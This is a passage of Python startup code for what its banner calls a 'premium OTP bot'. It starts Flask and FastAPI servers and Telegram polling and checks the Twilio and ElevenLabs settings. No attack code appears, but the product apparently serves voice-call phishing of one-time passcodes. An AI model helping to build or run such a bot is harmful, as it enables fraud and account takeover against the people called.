                logger.critical(f"Cannot bind Flask to port {TARGET_PORT}: {e}. Retrying in 5 seconds...")
                time.sleep(5)
                run_flask()  # Recursive retry
            else:
                logger.error(f"Flask OSError: {e}")
        except Exception as e:
            logger.error(f"Flask failed: {e}")
            logger.exception("Flask startup traceback:")

    def run_fastapi():
        try:
            import subprocess, os
            env = os.environ.copy()
            env["PYTHONPATH"] = str(Path(__file__).parent)
            fastapi_port = int(os.getenv("FASTAPI_PORT", "5001"))
            logger.info(f"Starting FastAPI uvicorn on port {fastapi_port}")
            try:
                result = subprocess.run([
                    sys.executable, "-m", "uvicorn",
                    "live_listen.server:app",
                    "--host", "0.0.0.0",
                    "--port", str(fastapi_port),
                    "--log-level", "info"
                ], cwd=str(Path(__file__).parent), env=env, capture_output=True, text=True, timeout=300)
            except subprocess.TimeoutExpired:
                logger.error(f"FastAPI uvicorn timed out after 300s")
                return
            if result.returncode != 0:
                logger.error(
                    "FastAPI uvicorn failed: %s\nstdout=%s\nstderr=%s",
                    result.returncode,
                    result.stdout.strip() if result.stdout else "(no stdout)",
                    result.stderr.strip() if result.stderr else "(no stderr)",
                )
            else:
                logger.info(f"FastAPI uvicorn exited cleanly with code {result.returncode}")
        except Exception as e:
            logger.exception(f"FastAPI initialization failed: {e}")

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    logger.info(f"Flask server started on 0.0.0.0:{TARGET_PORT}")
    
    fastapi_thread = threading.Thread(target=run_fastapi, daemon=True)
    fastapi_thread.start()
    logger.info(f"FastAPI server started on 0.0.0.0:{os.getenv('FASTAPI_PORT', '5001')}")
    
    time.sleep(2)

    # ========================================================================
    # STARTUP BANNER
    # ========================================================================
    logger.info("\n" + "="*70)
    logger.info("🚀 HOTTBOIIHITZZ PREMIUM OTP BOT v4.1 STARTED")
    logger.info("="*70)
    logger.info(f"Runtime Mode:          {runtime_mode.upper()}")
    logger.info(f"Flask Port:            {TARGET_PORT}")
    logger.info(f"FastAPI Port:          {os.getenv('FASTAPI_PORT', '5001')}")
    logger.info(f"Telegram Polling:      {'ACTIVE' if runtime_mode == 'full' else 'DISABLED'}")
    logger.info(f"Webhook Mode:          {USE_WEBHOOK}")
    logger.info(f"Twilio Configured:     {'YES' if twilio_client else 'NO'}")
    logger.info(f"ElevenLabs Configured: {'YES' if ELEVENLABS_API_KEY else 'NO'}")
    logger.info("="*70 + "\n")
    
    logger.info("Main process entering keepalive loop while background services run.")

    if runtime_mode == "full":
        if USE_WEBHOOK:
            if set_telegram_webhook():
                logger.info("Running in Telegram webhook mode. Polling disabled because webhook is active.")
            else:
                logger.warning("Telegram webhook mode enabled but webhook setup failed. Falling back to polling.")
                mark_webhook_mode(False)
                start_bot_polling(allowed_updates=["message", "callback_query", "chat_member"])
        else:
            # Ensure any existing Telegram webhook is removed on Telegram's side
            try:
                removed = False
                try:
                    bot.remove_webhook()
                    removed = True
                    logger.info("Telegram webhook removed via library before polling startup.")
                except Exception as e:
                    logger.debug(f"bot.remove_webhook() failed: {e}")
                # Force-delete via HTTP API as a fallback
                if not removed:
                    if force_delete_telegram_webhook():
                        logger.info("Telegram webhook removed via HTTP API fallback.")
                    else:
                        logger.warning("Could not remove webhook via API; continuing to start polling anyway.")
            except Exception:
                logger.exception("Unexpected error while attempting to clear Telegram webhook.")
            mark_webhook_mode(False)
            start_bot_polling(allowed_updates=["message", "callback_query", "chat_member"])
    else:
        logger.info("Skipping Telegram webhook and polling startup because the bot is not configured.")

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        logger.info("Shutdown requested by user. Stopping polling and exiting.")
        stop_bot_polling()